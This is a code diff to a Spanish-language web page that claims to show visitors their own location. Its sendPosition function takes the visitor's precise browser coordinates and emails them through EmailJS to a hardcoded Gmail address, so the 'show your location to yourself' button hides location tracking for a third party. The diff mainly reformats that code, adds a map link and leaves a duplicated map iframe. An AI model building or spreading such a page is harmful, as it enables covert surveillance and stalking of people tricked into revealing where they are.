@@ -70,42 +70,42 @@
     })();
 
     function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendPosition, showError, {
-  enableHighAccuracy: true,
-  timeout: 10000,
-  maximumAge: 0
-});
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendPosition, showError, {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    });
+  } else {
+    alert("Tu navegador no soporta geolocalización.");
+  }
+}
 
-      } else {
-        alert("Tu navegador no soporta geolocalización.");
-      }
-    }
+function sendPosition(position) {
+  const lat = position.coords.latitude;
+  const lon = position.coords.longitude;
 
-    function sendPosition(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
+  const map = document.getElementById("map");
+  map.src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
+  map.style.display = "block";
 
-      // Mostrar mapa
-      const map = document.getElementById("map");
-      map.src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
-      map.style.display = "block";
+  document.getElementById("map-link").href = `https://maps.google.com/?q=${lat},${lon}`;
+  document.getElementById("map-link").style.display = "inline";
 
-      // Enviar por correo con tu SERVICE ID y TEMPLATE correctos
-      emailjs.send('service_eehwsyj', 'template_zrbhi9m', {
-        latitude: lat,
-        longitude: lon,
-        to_email: 'jisusangel22@gmail.com'
-      })
-      .then(response => {
-        alert('¡Ubicación enviada correctamente!');
-        console.log('SUCCESS', response);
-      })
-      .catch(error => {
-        alert('Error al enviar ubicación: ' + JSON.stringify(error));
-        console.error('FAILED', error);
-      });
-    }
+  emailjs.send('service_eehwsyj', 'template_zrbhi9m', {
+    latitude: lat,
+    longitude: lon,
+    to_email: 'jisusangel22@gmail.com'
+  })
+  .then(response => {
+    alert('¡Ubicación enviada correctamente!');
+    console.log('SUCCESS', response);
+  })
+  .catch(error => {
+    alert('Error al enviar ubicación: ' + JSON.stringify(error));
+    console.error('FAILED', error);
+  });
+}
 
     function showError(error) {
       const errores = {
@@ -125,6 +125,9 @@
     <h1>Ver mi Ubicación</h1>
     <p>Haz clic en el botón para ver tu ubicación actual.</p>
     <button onclick="getLocation()">Mostrar tu Ubicación a ti mismo</button>
+<a id="map-link" target="_blank" style="display:none; color:#00c9ff; margin-top:10px;">Ver ubicación en Google Maps</a>
+<iframe id="map" allowfullscreen></iframe>
+
     <iframe id="map" allowfullscreen></iframe>
   </div>
 
